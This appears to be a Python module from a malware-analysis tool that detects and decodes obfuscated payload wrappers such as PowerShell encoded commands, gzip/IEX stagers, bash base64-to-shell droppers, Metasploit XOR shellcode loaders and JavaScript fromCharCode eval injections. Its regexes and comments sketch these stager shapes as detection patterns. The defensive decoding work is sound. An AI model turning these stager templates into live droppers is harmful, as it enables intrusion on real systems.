"""Named Wrapper Archetypes — first-class decoder handlers for known payload shapes.

Why this module exists
----------------------
The generic magic/smart decoder is a heuristic race that occasionally stops one
step too early on well-known wrappers (Empire / Cobalt-Strike PowerShell
one-liners, base64-piped bash droppers, Node Buffer stagers). That's a
whack-a-mole failure mode.

This module fixes it PERMANENTLY. Each archetype is:
    - a NAMED handler with a regex that either matches or doesn't
    - a fixed, deterministic decoder chain that ALWAYS works when the regex matches
    - a pytest regression that pins the archetype against real captured payloads

`deterministic_best_decode` (in analysis_core) tries archetypes FIRST. If any
matches, the archetype's chain wins with confidence=100 and we skip the race.
"""
from __future__ import annotations
import base64
import binascii
import gzip
import re
import zlib
from typing import Any, Dict, List, Optional


# ─── PowerShell variable resolver ────────────────────────────────────────
# Many real-world stagers assign the payload to a variable first, then feed
# the variable into FromBase64String / GzipStream / IEX. Example:
#     $b='H4sICD...=';
#     $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b));
#     $g=New-Object IO.Compression.GzipStream($m,...);
# Our archetype regexes expect a string LITERAL inside FromBase64String(...),
# so we pre-expand `$var='...'` / `$var="..."` assignments in-place before
# matching. This is a purely lexical rewrite — safe, deterministic, and
# invisible to callers.
#
# Supported shapes (single-quoted literals ARE NOT expanded by PowerShell,
# but we intentionally treat both quote styles the same because analysts
# copy/paste snippets and encoders often flip quote styles arbitrarily).
_PS_VAR_ASSIGN_RX = re.compile(
    r"\$(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*=\s*"
    r"(?P<q>['\"])(?P<val>[^'\"\r\n]{4,4096})(?P=q)\s*[;\r\n]",
)


def resolve_ps_variables(text: str, max_passes: int = 3) -> str:
    """Inline `$var='literal'` / `$var="literal"` assignments so downstream
    archetype regexes can see the raw base64 blob instead of a `$var` token.

    Runs up to `max_passes` times to resolve simple chains
    (`$a='X'; $b=$a; ...FromBase64String($b)`), then returns the rewritten
    text. Non-string assignments and expressions are left untouched.

    The assignment statements themselves are preserved as-is (only downstream
    references to the variable are inlined) so the rewritten script is still
    readable in traces.
    """
    if not text or "$" not in text:
        return text
    current = text
    for _ in range(max_passes):
        assigns: Dict[str, str] = {}
        # Record the byte ranges of the assignment RHS so we skip them
        # when substituting references — we don't want `$b='X'` to become
        # `'X'='X'`.
        assign_spans: List[tuple] = []
        for m in _PS_VAR_ASSIGN_RX.finditer(current):
            assigns[m.group("name")] = m.group("val")
            assign_spans.append((m.start(), m.end()))
        if not assigns:
            break

        def _in_assign(pos: int) -> bool:
            for a, b in assign_spans:
                if a <= pos < b:
                    return True
            return False

        # Sort longest-name first so `$aa` isn't shadowed by `$a`.
        pieces: List[tuple] = []  # (start, end, replacement)
        for name in sorted(assigns.keys(), key=len, reverse=True):
            val = assigns[name]
            rx = re.compile(r"\$" + re.escape(name) + r"(?![A-Za-z0-9_])")
            for m in rx.finditer(current):
                if _in_assign(m.start()):
                    continue
                pieces.append((m.start(), m.end(),
                               "'" + val.replace("'", "''") + "'"))
        if not pieces:
            break
        # Apply replacements right-to-left to keep offsets stable.
        pieces.sort(key=lambda t: t[0], reverse=True)
        rewritten = current
        for start, end, repl in pieces:
            rewritten = rewritten[:start] + repl + rewritten[end:]
        if rewritten == current:
            break
        current = rewritten
    return current


# ─── Robust base64 recovery ──────────────────────────────────────────────
_B64_ALPHA_RX = re.compile(r"[^A-Za-z0-9+/=_-]")


def robust_b64decode(blob: str) -> bytes:
    """Base64-decode with best-effort recovery.

    Handles:
      • whitespace / newlines
      • urlsafe variant (_ - underscore/dash)
      • missing / wrong padding (=)
      • stray suffix chars (length 4n+1 — mathematically impossible base64)
      • trailing garbage chars outside the alphabet

    Raises `binascii.Error` only when EVERY recovery path fails.
    """
    if not blob:
        raise binascii.Error("empty input")
    s = re.sub(r"\s+", "", blob)
    # urlsafe → standard
    s = s.replace("-", "+").replace("_", "/")
    # strip anything outside base64 alphabet (curly quotes, escapes, ...)
    s = _B64_ALPHA_RX.sub("", s)
    # remove any embedded = signs then re-pad
    core = s.rstrip("=")

    # Progressive recovery: try 0..3 trailing-char trims (fixes 4n+1 corruption)
    last_err: Optional[Exception] = None
    for trim in (0, 1, 2, 3):
        cand = core[: len(core) - trim] if trim else core
        # Pad to 4n
        cand_padded = cand + "=" * (-len(cand) % 4)
        try:
            return base64.b64decode(cand_padded, validate=False)
        except (binascii.Error, ValueError) as e:
            last_err = e
            continue
    # If everything else failed, try the raw with the loose decoder
    try:
        return base64.b64decode(s + "===", validate=False)
    except (binascii.Error, ValueError) as e:
        raise binascii.Error(f"base64 recovery exhausted: {last_err or e}")


def robust_b64_then_gunzip(blob: str) -> str:
    """base64 → gzip decompress, resilient to padding/length corruption,
    to truncated gzip streams (partial decompression recovers whatever
    bytes were successfully emitted before the truncation), AND to
    CRC-corrupt gzip trailers (real-world stagers frequently mangle the
    trailing 8 bytes — we salvage the raw DEFLATE payload after stripping
    the 10-byte header, any FNAME/FEXTRA/FCOMMENT/FHCRC fields, and the
    8-byte trailer).
    """
    raw = robust_b64decode(blob)
    try:
        return gzip.decompress(raw).decode("utf-8", errors="replace")
    except (EOFError, OSError, zlib.error):
        # (1) Truncated stream — recover whatever we can via a streaming decompressor.
        # gzip = zlib with 16+MAX_WBITS window bits.
        try:
            d = zlib.decompressobj(16 + zlib.MAX_WBITS)
            out = d.decompress(raw)
            # feed a small tail to flush any remaining decompressed bytes
            try:
                out += d.flush()
            except zlib.error:
                pass
            if out:
                partial = out.decode("utf-8", errors="replace")
                return partial + "\n\n[⚠ PARTIAL DECOMPRESSION — source stream was truncated]"
        except zlib.error:
            pass

        # (2) CRC-corrupt gzip — strip the RFC-1952 header + optional
        # FNAME/FEXTRA/FCOMMENT/FHCRC fields + 8-byte trailer, then feed the
        # raw DEFLATE bytes through zlib with a negative window bits.
        try:
            if len(raw) >= 18 and raw[0] == 0x1F and raw[1] == 0x8B:
                flags = raw[3]
                idx = 10
                # FEXTRA
                if flags & 0x04 and idx + 2 <= len(raw):
                    xlen = int.from_bytes(raw[idx:idx + 2], "little")
                    idx += 2 + xlen
                # FNAME (null-terminated)
                if flags & 0x08:
                    end = raw.find(b"\x00", idx)
                    idx = (end + 1) if end != -1 else idx
                # FCOMMENT (null-terminated)
                if flags & 0x10:
                    end = raw.find(b"\x00", idx)
                    idx = (end + 1) if end != -1 else idx
                # FHCRC (2 bytes)
                if flags & 0x02:
                    idx += 2
                deflate_body = raw[idx:-8]
                if deflate_body:
                    salvaged = zlib.decompress(deflate_body, -zlib.MAX_WBITS)
                    if salvaged:
                        return salvaged.decode("utf-8", errors="replace") + \
                            "\n\n[⚠ GZIP CRC INVALID — content salvaged via raw-deflate fallback]"
        except (zlib.error, IndexError, ValueError):
            pass
        raise


def robust_b64_then_deflate(blob: str) -> str:
    """base64 → raw deflate / zlib decompress."""
    raw = robust_b64decode(blob)
    try:
        return zlib.decompress(raw).decode("utf-8", errors="replace")
    except zlib.error:
        return zlib.decompress(raw, -zlib.MAX_WBITS).decode("utf-8", errors="replace")


# ─── Archetype registry ──────────────────────────────────────────────────
#
# Each archetype is a dict:
#   {
#     "id":          short unique name (also used as engine label)
#     "description": human-readable
#     "regex":       compiled regex; must have a group named "blob" OR return
#                    the blob via `extract` fn
#     "chain":       list of decoder-op ids (informational, used in trace)
#     "handler":     callable(text) -> decoded str (raises on any failure)
#   }

def _match_group(rx: "re.Pattern[str]", text: str) -> Optional[str]:
    m = rx.search(text)
    if not m:
        return None
    try:
        return m.group("blob")
    except IndexError:
        return m.group(1) if m.groups() else None


# 0. PS_EncodedCommand — the CLI-flag form (most common PowerShell obfuscation)
#    powershell.exe [-NoP] [-NonI] [-W Hidden] -Enc  "<base64>"
#    powershell     -EncodedCommand '<base64>'
#    powershell.exe -e  <base64>
#
#    Canonical semantics: base64 → UTF-16LE PowerShell script.
#    But red-teamers and IR analysts routinely paste malformed variants
#    where the base64 encodes ASCII/UTF-8 directly. Our handler tries
#    UTF-16LE first (canonical), falls back to UTF-8 / latin-1 when the
#    UTF-16LE decode produces mostly-non-printable output.
_PS_ENC_CLI_RX = re.compile(
    r"powershell(?:\.exe)?"                        # binary name
    r"[^\r\n\"']{0,200}?"                          # any inter-flag slop (values, dashes, spaces)
    r"[\s/-]-?(?:e|ec|enc|encoded|encodedcommand)\b"  # -Enc / -EncodedCommand / /enc
    r"\s+[\"']?"                                   # optional quote
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{20,})"          # the base64 blob (may span lines / include whitespace)
    r"[\"']?",
    re.IGNORECASE,
)


def _looks_like_text(s: str, min_ratio: float = 0.7) -> bool:
    """Heuristic: fraction of printable ASCII chars ≥ min_ratio."""
    if not s:
        return False
    printable = sum(1 for c in s if 32 <= ord(c) < 127 or c in "\r\n\t")
    return (printable / len(s)) >= min_ratio


def _handle_ps_enc_cli(text: str) -> str:
    blob = _match_group(_PS_ENC_CLI_RX, text)
    if not blob:
        raise ValueError("no blob match")
    # Strip whitespace / newlines that PowerShell -Enc happily ignores.
    blob = re.sub(r"\s+", "", blob)
    raw = robust_b64decode(blob)

    # Feb-2026 · Try ALL three encodings, score each on printable-ASCII
    # density, and pick the winner. This fixes mixed-encoding payloads
    # (row-0001 style) where UTF-16LE passes _looks_like_text() but the
    # tail is actually UTF-8 sequential — UTF-16LE renders that as Han
    # ideographs. UTF-8 would recover more real text in those cases.
    def _score(s: str) -> int:
        if not s:
            return 0
        # Count printable ASCII + common whitespace
        return sum(1 for c in s if 32 <= ord(c) < 127 or c in "\r\n\t")
    candidates = []
    for enc in ("utf-16le", "utf-8", "latin-1"):
        try:
            s = raw.decode(enc, errors="replace")
            candidates.append((enc, s, _score(s)))
        except Exception:
            continue
    if not candidates:
        return raw.decode("latin-1", errors="replace")
    # Prefer utf-16le if it wins outright; else take highest-score.
    candidates.sort(key=lambda x: (-x[2], 0 if x[0] == "utf-16le" else 1))
    winner_enc, winner_txt, winner_score = candidates[0]
    # If the winner has a mixed-encoding smell (Han ideographs etc.),
    # emit BOTH so the analyst can pick.
    def _is_garbled(s: str) -> bool:
        bad = sum(1 for c in s if ord(c) > 0x2000 or c == "\ufffd")
        return bad >= 2 and bad / max(1, len(s)) > 0.10
    if _is_garbled(winner_txt) and len(candidates) > 1:
        alt_enc, alt_txt, _ = candidates[1]
        banner = (
            f"\n──── PS_EncodedCommand · encoding-mixed payload (Feb 2026) ────\n"
            f"Two candidate decodes shown — payload appears corrupt/mixed:\n"
            f"  {winner_enc:>9}: {winner_txt!r}\n"
            f"  {alt_enc:>9}: {alt_txt!r}\n"
        )
        return winner_txt + banner
    return winner_txt


# 1. PS_MemoryStream_Gzip_IEX
#    $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("<blob>"));
#    IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(
#        $s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
_PS_MEMSTREAM_GZIP_RX = re.compile(
    r"IO\.MemoryStream[^)]*FromBase64String\s*\(\s*[\"']"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{40,})"
    r"[\"']"
    r"[\s\S]{0,400}?"
    r"GzipStream[\s\S]{0,200}?ReadToEnd",
    re.IGNORECASE,
)

def _handle_ps_memstream_gzip(text: str) -> str:
    blob = _match_group(_PS_MEMSTREAM_GZIP_RX, text)
    if not blob:
        raise ValueError("no blob match")
    return robust_b64_then_gunzip(blob)


# 2. PS_MemoryStream_Deflate_IEX (Deflate variant)
_PS_MEMSTREAM_DEFLATE_RX = re.compile(
    r"IO\.MemoryStream[^)]*FromBase64String\s*\(\s*[\"']"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{40,})"
    r"[\"']"
    r"[\s\S]{0,400}?"
    r"DeflateStream[\s\S]{0,200}?ReadToEnd",
    re.IGNORECASE,
)

def _handle_ps_memstream_deflate(text: str) -> str:
    blob = _match_group(_PS_MEMSTREAM_DEFLATE_RX, text)
    if not blob:
        raise ValueError("no blob match")
    return robust_b64_then_deflate(blob)


# 3. PS_FromBase64String_UTF16LE  (classic -EncodedCommand)
_PS_FB64_UTF16_RX = re.compile(
    r"\[(?:System\.)?Text\.Encoding\]::(?:Unicode|UTF-?16(?:LE)?)"
    r"\.GetString\s*\("
    r"\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*[\"']"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{16,})"
    r"[\"']",
    re.IGNORECASE,
)

def _handle_ps_fb64_utf16(text: str) -> str:
    blob = _match_group(_PS_FB64_UTF16_RX, text)
    if not blob:
        raise ValueError("no blob match")
    raw = robust_b64decode(blob)
    decoded_utf16 = raw.decode("utf-16le", errors="replace")
    # Feb-2026 · Corrupted-payload fallback: if the UTF-16LE decode
    # contains Han-ideograph or replacement chars in the middle of an
    # otherwise-ASCII payload, the attacker may have shipped a mixed
    # encoding (some bytes are UTF-16LE, others are UTF-8 sequential).
    # Try a plain UTF-8 decode as a second interpretation and show BOTH
    # so the analyst can pick — this is the row-0001 style corrupt case.
    def _is_probably_garbled(s: str) -> bool:
        if not s:
            return True
        bad = sum(1 for ch in s if ord(ch) > 0x2000 or ch == "\ufffd")
        return bad >= 2 or (bad and bad / max(1, len(s)) > 0.15)
    if _is_probably_garbled(decoded_utf16):
        try:
            decoded_utf8 = raw.decode("utf-8", errors="replace")
        except Exception:
            decoded_utf8 = ""
        banner = (
            "\n──── Encoding-Mixed Payload Detected (Feb 2026) ────\n"
            "UTF-16LE decode produced non-ASCII glyphs — payload may be\n"
            "corrupted or mixed-encoded. Both interpretations shown:\n\n"
            f"  UTF-16LE : {decoded_utf16!r}\n"
            f"  UTF-8    : {decoded_utf8!r}\n"
        )
        return decoded_utf16 + banner
    return decoded_utf16


# 3b. PS_FromBase64String_ASCII  (Feb 2026 fix — explicit ASCII decoder)
#     Handles [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...'))
#     — previously mis-classified as UTF-16LE which produced garbage.
_PS_FB64_ASCII_RX = re.compile(
    r"\[(?:System\.)?Text\.Encoding\]::(?:ASCII|UTF-?8|Default)"
    r"\.GetString\s*\("
    r"\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*[\"']"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{16,})"
    r"[\"']",
    re.IGNORECASE,
)

def _handle_ps_fb64_ascii(text: str) -> str:
    blob = _match_group(_PS_FB64_ASCII_RX, text)
    if not blob:
        raise ValueError("no blob match")
    raw = robust_b64decode(blob)
    try:
        return raw.decode("ascii")
    except UnicodeDecodeError:
        # PowerShell's ASCII.GetString replaces >0x7F bytes with '?'.
        return "".join(chr(b) if b < 0x80 else "?" for b in raw)


# 3c. PS_FROMBASE64_ASCII_FROMHEX  (Feb 2026 · full nested chain)
#     iex(
#       [Text.Encoding]::ASCII.GetString(
#         [Convert]::FromHexString(
#           [Text.Encoding]::ASCII.GetString(
#             [Convert]::FromBase64String('<b64>')
#           )
#         )
#       )
#     )
#
# Deterministically unwinds all four layers. If the inner b64 output is
# ITSELF a base64 string (trailing '='), recursively unwinds a second
# layer before hex-decoding. Reports each layer explicitly.
_PS_B64_HEX_ASCII_RX = re.compile(
    r"(?:System\.)?Convert\]::FromHexString\s*\("
    r"[\s\S]{0,120}?"
    r"(?:System\.)?Convert\]::FromBase64String\s*\(\s*[\"']"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{16,})[\"']",
    re.IGNORECASE,
)

def _ps_b64_hex_ascii_matches(text: str) -> bool:
    return bool(_PS_B64_HEX_ASCII_RX.search(text))

def _handle_ps_b64_hex_ascii(text: str) -> str:
    import base64 as _b64, binascii as _binascii
    m = _PS_B64_HEX_ASCII_RX.search(text)
    if not m:
        raise ValueError("no nested b64+hex match")
    blob = m.group("blob").strip()
    lines: List[str] = ["──── Nested FromBase64 → FromHex → ASCII Chain ────"]
    lines.append(f"Layer 1  · FromBase64String input   : {blob[:80]}{'…' if len(blob)>80 else ''}")
    try:
        step1 = robust_b64decode(blob)
    except Exception as e:  # noqa: BLE001
        lines.append(f"Layer 1  · ERROR  b64-decode failed: {e}")
        return f"{text}\n\n" + "\n".join(lines)
    step1_ascii = "".join(chr(b) if b < 0x80 else "?" for b in step1)
    lines.append(f"Layer 2  · ASCII.GetString          : {step1_ascii}")

    # Detect if step1 is itself Base64 (attackers often double-encode)
    hex_source = step1_ascii
    if step1_ascii.endswith("=") or re.fullmatch(r"[A-Za-z0-9+/=]+", step1_ascii or ""):
        try:
            inner = _b64.b64decode(step1_ascii, validate=False)
            inner_ascii = inner.decode("ascii", errors="replace")
            if re.fullmatch(r"[0-9A-Fa-f\s]+", inner_ascii or ""):
                lines.append(f"Layer 2b · (double-b64 detected) inner : {inner_ascii}")
                hex_source = inner_ascii
        except Exception:  # noqa: BLE001
            pass

    hex_clean = re.sub(r"\s+", "", hex_source)
    if len(hex_clean) % 2 == 1:
        hex_clean = hex_clean[:-1]
    try:
        step3_bytes = _binascii.unhexlify(hex_clean)
    except Exception as e:  # noqa: BLE001
        lines.append(f"Layer 3  · ERROR  FromHexString failed on non-hex input: {e}")
        lines.append(
            "         (payload appears malformed — inner b64 output is not valid hex; "
            "will crash at PS runtime)"
        )
        return f"{text}\n\n" + "\n".join(lines)
    lines.append(f"Layer 3  · FromHexString → bytes    : {step3_bytes.hex()}")
    step4_ascii = "".join(chr(b) if b < 0x80 else "?" for b in step3_bytes)
    lines.append(f"Layer 4  · ASCII.GetString (FINAL)  : {step4_ascii!r}")
    return f"{text}\n\n" + "\n".join(lines)


# 4. Bash_base64_gunzip_pipe
#     echo 'xxx' | base64 -d | gunzip | bash    (any pipe order after base64 -d)
_BASH_B64_GUNZIP_RX = re.compile(
    r"echo\s+[\"']?(?P<blob>[A-Za-z0-9+/=_\-\s]{40,})[\"']?"
    r"\s*\|\s*base64\s+-d\s*\|\s*(?:gunzip|gzip\s+-d|zcat)",
    re.IGNORECASE,
)

def _handle_bash_b64_gunzip(text: str) -> str:
    blob = _match_group(_BASH_B64_GUNZIP_RX, text)
    if not blob:
        raise ValueError("no blob match")
    return robust_b64_then_gunzip(blob)


# 5. Bash_base64_pipe_bash  (echo '<b64>' | base64 -d | bash)
_BASH_B64_PIPE_RX = re.compile(
    r"echo\s+[\"']?(?P<blob>[A-Za-z0-9+/=_\-\s]{8,})[\"']?"
    r"\s*\|\s*base64\s+-d\s*\|\s*(?:sh|bash|/bin/sh|/bin/bash)",
    re.IGNORECASE,
)

def _handle_bash_b64_pipe(text: str) -> str:
    blob = _match_group(_BASH_B64_PIPE_RX, text)
    if not blob:
        raise ValueError("no blob match")
    return robust_b64decode(blob).decode("utf-8", errors="replace")


# 6. Node_Buffer_from_gunzip
#     zlib.gunzipSync(Buffer.from('<b64>','base64')) → eval           (typical order)
#     Buffer.from('<b64>','base64') → zlib.gunzipSync                (alt order)
_NODE_BUF_GUNZIP_RX = re.compile(
    r"(?:"
    r"(?:gunzip|inflate)Sync[\s\S]{0,120}?"
    r"Buffer\.from\s*\(\s*[\"'](?P<blob>[A-Za-z0-9+/=_\-\s]{40,})[\"']\s*,\s*[\"']base64[\"']\s*\)"
    r"|"
    r"Buffer\.from\s*\(\s*[\"'](?P<blob2>[A-Za-z0-9+/=_\-\s]{40,})[\"']\s*,\s*[\"']base64[\"']\s*\)"
    r"[\s\S]{0,200}?(?:gunzip|inflate)Sync"
    r")",
    re.IGNORECASE,
)

def _handle_node_buf_gunzip(text: str) -> str:
    m = _NODE_BUF_GUNZIP_RX.search(text)
    if not m:
        raise ValueError("no blob match")
    blob = m.group("blob") or m.group("blob2")
    if not blob:
        raise ValueError("no blob match")
    return robust_b64_then_gunzip(blob)


# 7. Generic FromBase64String + GzipStream (order-insensitive fallback for #1)
_GENERIC_B64_GZIP_RX = re.compile(
    r"FromBase64String\s*\(\s*[\"'](?P<blob>[A-Za-z0-9+/=_\-\s]{80,})[\"']"
    r"[\s\S]{0,500}?"
    r"(?:GzipStream|Gzip|Decompress)",
    re.IGNORECASE,
)

def _handle_generic_b64_gzip(text: str) -> str:
    blob = _match_group(_GENERIC_B64_GZIP_RX, text)
    if not blob:
        raise ValueError("no blob match")
    return robust_b64_then_gunzip(blob)


# 8. PS_MSF_XOR_Stage2 — Metasploit / Meterpreter reflective shellcode loader.
#    Matches the classic $DoIt loader script produced by
#    `msfvenom -f psh` and Empire's `powershell/inject/reflective_pick`.
#
#    Signature triad (all three required):
#        (a) [Byte[]]$var_code = [System.Convert]::FromBase64String('<b64>')
#        (b) -bxor <key>              (single-byte XOR loop)
#        (c) func_get_proc_address    (reflective PEB walker helper — Meterpreter tell)
#                     OR
#            VirtualAlloc / CreateThread    (raw reflective loader)
#
#    The handler:
#        1. extracts the nested $var_code base64,
#        2. base64-decodes → raw bytes,
#        3. XORs with the extracted key,
#        4. returns the resulting shellcode bytes as a latin-1 string so the
#           frontend `detectShellcode()` prologue check + `extractShellcodeIocs()`
#           fire → the SOC Verdict panel promotes the C2 IP and User-Agent.
_PS_MSF_LOADER_VARCODE_RX = re.compile(
    r"\[?Byte\[\]\]?\s*\$\w+\s*=\s*"
    r"\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['\"]"
    r"(?P<blob>[A-Za-z0-9+/=_\-\s]{40,})"
    r"['\"]",
    re.IGNORECASE,
)
_PS_MSF_LOADER_XOR_RX = re.compile(r"-bxor\s+(0x[0-9a-fA-F]+|\d+)", re.IGNORECASE)
_PS_MSF_LOADER_MARKER_RX = re.compile(
    r"(?:func_get_proc_address|VirtualAlloc|CreateThread|WaitForSingleObject|"
    r"kernel32|Reflection\.Emit|DefineDynamicAssembly)",
    re.IGNORECASE,
)


def _msf_loader_matches(text: str) -> bool:
    return (
        _PS_MSF_LOADER_VARCODE_RX.search(text) is not None
        and _PS_MSF_LOADER_XOR_RX.search(text) is not None
        and _PS_MSF_LOADER_MARKER_RX.search(text) is not None
    )


def _handle_ps_msf_xor_stage2(text: str) -> str:
    b64_m = _PS_MSF_LOADER_VARCODE_RX.search(text)
    key_m = _PS_MSF_LOADER_XOR_RX.search(text)
    if not b64_m or not key_m:
        raise ValueError("no msf-loader match")
    raw = robust_b64decode(b64_m.group("blob"))
    key_str = key_m.group(1)
    key = int(key_str, 0) & 0xFF
    sc = bytes(b ^ key for b in raw)
    if len(sc) < 16:
        raise ValueError("shellcode too short")
    # Return as latin-1 str so the frontend can inspect prologue bytes AND
    # regex-extract embedded strings (User-Agent, C2 IP).
    return sc.decode("latin-1")


# 9. PS_ASCII_XOR_IEX — Ascii-decimal + single-byte XOR + IEX.
#
#    Signature (case-insensitive, whitespace-tolerant):
#        (int, int, int, ...)                                      # integer list
#        | foreach-object{[char]($_ -bxor '<key>')}                # per-byte XOR
#        -join ''                                                  # join to string
#        | invoke-expression                                       # exec
#
#    Where `<key>` is `0xNN` or a decimal 0-255 (with or without quotes).
#    Attackers habit-case-mangle every keyword: `fOREACh-objEct`,
#    `[ChAR]`, `bxoR`, `jOIn`, `InVOKE-ExpressIon`. All case-insensitive here.
#
#    RESILIENCE — the outer regex intentionally accepts a lax `[\d,\s]+` blob
#    between `(` and `)`. This is required because terminal / chat / email
#    line-wraps routinely CHOP an integer across two lines (e.g. `83,8\n3`
#    which is really `83, 83`). The handler strips ALL whitespace from the
#    captured blob before splitting on `,`, which restores the intended
#    integer sequence without heuristic guessing.
#
#    The whole point of this archetype is to STOP the current pipeline from
#    stripping the wrapper down to a bare digit run (which is what
#    `extract-payload` currently does — the `-bxor` metadata is lost). This
#    handler recovers the ORIGINAL PowerShell script (`Write-Host 'Hello…'`
#    or a malicious payload) in a single pass, no LLM required.
_PS_ASCII_XOR_IEX_INTS_RX = re.compile(
    r"\(\s*(?P<ints>[\d][\d,\s]{6,}[\d])\s*\)",
    re.IGNORECASE | re.DOTALL,
)
_PS_ASCII_XOR_IEX_KEY_RX = re.compile(
    r"-bxor\s*['\"]?\s*(0x[0-9a-fA-F]{1,2}|\d{1,3})\s*['\"]?",
    re.IGNORECASE,
)
_PS_ASCII_XOR_IEX_FOREACH_RX = re.compile(
    r"foreach\s*-\s*object\s*\{\s*\[\s*char\s*\]\s*\(\s*\$_\s*-bxor",
    re.IGNORECASE,
)
_PS_ASCII_XOR_IEX_JOIN_RX = re.compile(
    r"-\s*join\s*['\"]{2}",
    re.IGNORECASE,
)
_PS_ASCII_XOR_IEX_IEX_RX = re.compile(
    r"\|\s*invoke\s*-\s*expression|\|\s*iex\b",
    re.IGNORECASE,
)


def _ps_ascii_xor_iex_matches(text: str) -> bool:
    return (
        _PS_ASCII_XOR_IEX_INTS_RX.search(text) is not None
        and _PS_ASCII_XOR_IEX_KEY_RX.search(text) is not None
        and _PS_ASCII_XOR_IEX_FOREACH_RX.search(text) is not None
        and _PS_ASCII_XOR_IEX_JOIN_RX.search(text) is not None
        # IEX terminal is REQUIRED so we only fire on executable payloads.
        # Without IEX the analyst may just be XOR-encoding data for storage —
        # different intent, don't collapse into script text.
        and _PS_ASCII_XOR_IEX_IEX_RX.search(text) is not None
    )


def _handle_ps_ascii_xor_iex(text: str) -> str:
    ints_m = _PS_ASCII_XOR_IEX_INTS_RX.search(text)
    key_m = _PS_ASCII_XOR_IEX_KEY_RX.search(text)
    if not ints_m or not key_m:
        raise ValueError("no PS_ASCII_XOR_IEX match")
    key = int(key_m.group(1), 0) & 0xFF
    ints_raw = ints_m.group("ints")
    # WRAP-RESILIENT PARSING — strip ALL whitespace from the captured int
    # blob so terminal / chat / email line-wraps that chopped an integer
    # across two lines (`83,8\n3` = intended `83, 83`) are healed before
    # split. This is safe because the archetype's structural markers
    # (`-bxor`, `foreach-object`, `-join''`, `iex`) already confirm we're
    # inside a comma-separated PowerShell list — whitespace is never a
    # legitimate separator here.
    ints_clean = re.sub(r"\s+", "", ints_raw)
    tokens = [t for t in ints_clean.split(",") if t]
    nums: List[int] = []
    for t in tokens:
        if not t.isdigit():
            continue
        v = int(t)
        if 0 <= v <= 255:
            nums.append(v)
    if len(nums) < 4:
        raise ValueError("integer list too short")
    decoded = "".join(chr(n ^ key) for n in nums)
    # Sanity: decoded must be predominantly printable ASCII/UTF-8.
    printable = sum(1 for c in decoded if 32 <= ord(c) < 127 or c in "\r\n\t")
    if printable / max(1, len(decoded)) < 0.80:
        raise ValueError("xor result not printable — key mismatch")
    return decoded


# 10. PS_ASCII_DECIMAL_JOIN — Ascii-decimal + [char] + join (NO XOR variant).
#
#    Signature (case-insensitive, whitespace-tolerant):
#        (int, int, int, ...)
#        | foreach-object{[char]$_}     OR     | %{[char]$_}
#        | Join-String                  OR     -join ''            OR   | Out-String
#        (optional: | Invoke-Expression / iex)
#
#    Same wrap-resilient integer parsing as PS_ASCII_XOR_IEX. IEX terminal
#    is OPTIONAL here — the archetype fires whenever the analyst pastes a
#    `[char]$_`-style ASCII-decimal payload, which is a very common
#    Nishang / Invoke-Obfuscation shape.
_PS_ASCII_DEC_JOIN_CHAR_RX = re.compile(
    r"(?:foreach\s*-\s*object|%)\s*\{\s*\[\s*char\s*\]\s*\$_\s*\}",
    re.IGNORECASE,
)
_PS_ASCII_DEC_JOIN_TERM_RX = re.compile(
    r"(?:-\s*join\s*['\"]{0,2}|join\s*-\s*string|out\s*-\s*string)",
    re.IGNORECASE,
)


def _ps_ascii_decimal_join_matches(text: str) -> bool:
    # Reject payloads that already have `-bxor` — those belong to
    # PS_ASCII_XOR_IEX and must not be double-decoded.
    if _PS_ASCII_XOR_IEX_KEY_RX.search(text):
        return False
    return (
        _PS_ASCII_XOR_IEX_INTS_RX.search(text) is not None
        and _PS_ASCII_DEC_JOIN_CHAR_RX.search(text) is not None
        and _PS_ASCII_DEC_JOIN_TERM_RX.search(text) is not None
    )


def _handle_ps_ascii_decimal_join(text: str) -> str:
    ints_m = _PS_ASCII_XOR_IEX_INTS_RX.search(text)
    if not ints_m:
        raise ValueError("no PS_ASCII_DECIMAL_JOIN match")
    ints_clean = re.sub(r"\s+", "", ints_m.group("ints"))
    tokens = [t for t in ints_clean.split(",") if t]
    nums: List[int] = []
    for t in tokens:
        if not t.isdigit():
            continue
        v = int(t)
        if 0 <= v <= 255:
            nums.append(v)
    if len(nums) < 4:
        raise ValueError("integer list too short")
    decoded = "".join(chr(n) for n in nums)
    printable = sum(1 for c in decoded if 32 <= ord(c) < 127 or c in "\r\n\t")
    if printable / max(1, len(decoded)) < 0.80:
        raise ValueError("decoded result not printable")
    return decoded


# 11. JS_STRING_FROMCHARCODE_EVAL — JavaScript ASCII decimal in <script>eval(String.fromCharCode(...))</script>
#
#     Fake-update / SocGholish-style HTML injection. Attackers stash the real
#     JS payload as a String.fromCharCode(72,105,...) call inside an <script>
#     eval(...) wrapper so static grep for `atob` / `unescape` misses.
_JS_FROMCHARCODE_RX = re.compile(
    r"String\s*\.\s*fromCharCode\s*\(\s*(?P<ints>[\d][\d,\s]{6,}[\d])\s*\)",
    re.IGNORECASE | re.DOTALL,
)


def _js_fromcharcode_matches(text: str) -> bool:
    return _JS_FROMCHARCODE_RX.search(text) is not None


def _handle_js_fromcharcode(text: str) -> str:
    m = _JS_FROMCHARCODE_RX.search(text)
    if not m:
        raise ValueError("no fromCharCode match")
    ints_clean = re.sub(r"\s+", "", m.group("ints"))
    tokens = [t for t in ints_clean.split(",") if t]
    nums: List[int] = []
    for t in tokens:
        if not t.isdigit():
            continue
        v = int(t)
        if 0 <= v <= 0x10FFFF:
            nums.append(v)
    if len(nums) < 3:
        raise ValueError("integer list too short")
    decoded = "".join(chr(n) for n in nums)
    printable = sum(1 for c in decoded if 32 <= ord(c) < 127 or c in "\r\n\t")
    if printable / max(1, len(decoded)) < 0.80:
        raise ValueError("decoded result not printable")
    return decoded


# 12. PS_BINARY_SPLIT_TOINT16 — Invoke-Obfuscation binary/hex-array shape.
#
